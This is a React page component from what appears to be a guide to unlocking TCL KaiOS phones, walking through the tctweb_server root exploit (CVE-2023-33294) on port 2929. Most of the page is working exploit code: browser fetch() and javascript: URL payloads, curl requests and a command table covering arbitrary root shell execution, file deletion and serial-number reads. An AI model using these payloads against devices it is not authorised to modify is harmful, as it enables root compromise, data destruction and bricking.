import { Server, Skull } from 'lucide-react';
import CodeBlock from '../components/CodeBlock';
import StepCard from '../components/StepCard';
import WarningBox from '../components/WarningBox';

export default function Method2_TCTWebServer() {
  return (
    <div className="animate-fade-in">
      <h2 className="text-2xl font-bold text-white mb-2 flex items-center gap-2">
        <Server className="text-red-400" size={24} />
        Method 2 — TCT Web Server Exploit (CVE-2023-33294)
      </h2>
      <p className="text-gray-400 mb-2">
        Difficulty: <span className="text-yellow-400 font-semibold">Medium</span> · Risk: <span className="text-red-400 font-semibold">High</span> · Reversible: <span className="text-yellow-400 font-semibold">Partially</span>
      </p>
      <p className="text-gray-400 mb-6">
        TCL KaiOS devices ship with a binary called <code className="text-cyan-400 bg-gray-800 px-1 rounded text-xs">/system/bin/tctweb_server</code> that exposes a local HTTP server on port 2929.
        On KaiOS 3.0, this server accepted arbitrary shell commands as root with zero authentication.
        It was reportedly removed in KaiOS 3.1 — but this was observed on <strong>Nokia</strong> devices. Since the binary is <strong>TCL-specific</strong>, it may still be present on your TCL T435D.
      </p>

      <WarningBox level="danger">
        <strong>This is a root-level exploit.</strong> If the server is present and unpatched, you can execute arbitrary commands as root. Be extremely careful — wrong commands can brick your device. Commands that modify <code>persist.moz.killswitch</code> will render your phone permanently inoperable.
      </WarningBox>

      <StepCard number={1} title="Probe the server from the browser">
        <p className="mb-3">
          Open the built-in Browser on your phone and navigate to:
        </p>
        <CodeBlock code="http://127.0.0.1:2929" title="Navigate to this URL" />
        <p className="mt-2">If the server is running, you'll get some kind of response (possibly JSON, HTML, or an error message). If you get a "connection refused" or blank page, the server may not be present. Also try:</p>
        <CodeBlock code="http://127.0.0.1:2929/?cmd=devInfo&cmdshell=getversion" title="Probe with a command" />
      </StepCard>

      <StepCard number={2} title="Test basic command execution">
        <p className="mb-3">
          If the server responded, try running this JavaScript in the browser. Navigate to any page and open the URL bar, type:
        </p>
        <CodeBlock
          code={`javascript:void(fetch('http://127.0.0.1:2929',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd=bash&cmdshell=readfile&filename=/system/build.prop'}).then(r=>r.text()).then(t=>document.title=t.substring(0,50)))`}
          language="javascript"
          title="Probe build.prop via browser URL bar"
        />
        <p className="mt-2 text-gray-400">If this works, the page title will change to show the first 50 characters of your build.prop file. This confirms root command execution.</p>
      </StepCard>

      <StepCard number={3} title="Enable ADB via system properties">
        <p className="mb-3">If command execution works, enable ADB debugging by setting the system property:</p>
        <CodeBlock
          code={`// Enable ADB
fetch('http://127.0.0.1:2929', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'cmd=shell&shellcommand=setprop persist.service.adb.enable 1'
});

// Alternative syntax that may work:
fetch('http://127.0.0.1:2929', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'cmd=bash&cmdshell=setprop&propname=persist.service.adb.enable&propvalue=1'
});`}
          language="javascript"
          title="Enable ADB via tctweb_server"
        />
      </StepCard>

      <StepCard number={4} title="If server is hardened (KaiOS 3.1+)">
        <p className="mb-3">
          On newer builds, the server may have a whitelist. Try probing what commands are still allowed:
        </p>
        <CodeBlock
          code={`// Try whitelisted diagnostic commands
fetch('http://127.0.0.1:2929', {
  method: 'POST',
  body: 'name=query&api=ro.build.type'
}).then(r => r.text()).then(console.log);

// Try getting device info
fetch('http://127.0.0.1:2929', {
  method: 'POST',
  body: 'cmd=devInfo&cmdshell=getversion'
}).then(r => r.text()).then(console.log);

// Try shell command format
fetch('http://127.0.0.1:2929', {
  method: 'POST',
  body: 'cmd=shell&shellcommand=getprop ro.build.type'
}).then(r => r.text()).then(console.log);`}
          language="javascript"
          title="Probe whitelisted commands"
        />
        <p className="mt-2 text-gray-400">
          Even if arbitrary shell access is blocked, whitelisted property queries or diagnostic commands may reveal useful information about the build, or allow toggling specific system properties.
        </p>
      </StepCard>

      <StepCard number={5} title="Forward port via ADB (if ADB is already working)">
        <p className="mb-3">
          If you got ADB working from Method 1, you can interact with the tctweb_server from your computer:
        </p>
        <CodeBlock
          code={`# Forward port 2929 from phone to computer
adb forward tcp:2929 tcp:2929

# Now test from your computer's browser or curl:
curl -X POST http://127.0.0.1:2929 \\
  -d "cmd=bash&cmdshell=readfile&filename=/system/build.prop"

# Or try:
curl -X POST http://127.0.0.1:2929 \\
  -d "cmd=devInfo&cmdshell=getversion"`}
          language="bash"
          title="Forward port and test from PC"
        />
      </StepCard>

      <div className="mt-6 bg-gray-900/60 border border-red-500/20 rounded-xl p-5">
        <h3 className="text-white font-semibold mb-2 flex items-center gap-2">
          <Skull size={16} className="text-red-400" />
          Known tctweb_server Commands (KaiOS 3.0)
        </h3>
        <div className="overflow-x-auto">
          <table className="w-full text-sm font-mono">
            <thead>
              <tr className="border-b border-gray-700 text-left">
                <th className="py-2 pr-4 text-cyan-400">Command</th>
                <th className="py-2 pr-4 text-cyan-400">Parameter</th>
                <th className="py-2 text-cyan-400">Description</th>
              </tr>
            </thead>
            <tbody className="text-gray-400">
              {[
                ['cmd=bash', 'cmdshell=readfile&filename=...', 'Read a file'],
                ['cmd=bash', 'cmdshell=deletefile&filename=...', 'Delete a file'],
                ['cmd=bash', 'cmdshell=setprop&propname=...&propvalue=...', 'Set system property'],
                ['cmd=bash', 'cmdshell=getprop&propname=...', 'Get system property'],
                ['cmd=shell', 'shellcommand=<any bash>', 'Execute arbitrary shell command'],
                ['cmd=devInfo', 'cmdshell=getversion', 'Get firmware version'],
                ['cmd=devInfo', 'cmdshell=getsn', 'Get serial number'],
                ['cmd=nvaccess', 'cmdshell=readnv&nvid=...', 'Read NV item'],
                ['name=query', 'api=<prop.name>', 'Query system property (newer syntax)'],
              ].map(([cmd, param, desc], i) => (
                <tr key={i} className="border-b border-gray-800/50">
                  <td className="py-2 pr-4 text-green-400">{cmd}</td>
                  <td className="py-2 pr-4 text-yellow-300">{param}</td>
                  <td className="py-2 text-gray-300">{desc}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
        <p className="text-xs text-gray-500 mt-3">
          * On KaiOS 3.1 TCL devices, many of these may be whitelisted/blocked. Probe each one to see what works.
        </p>
      </div>
    </div>
  );
}
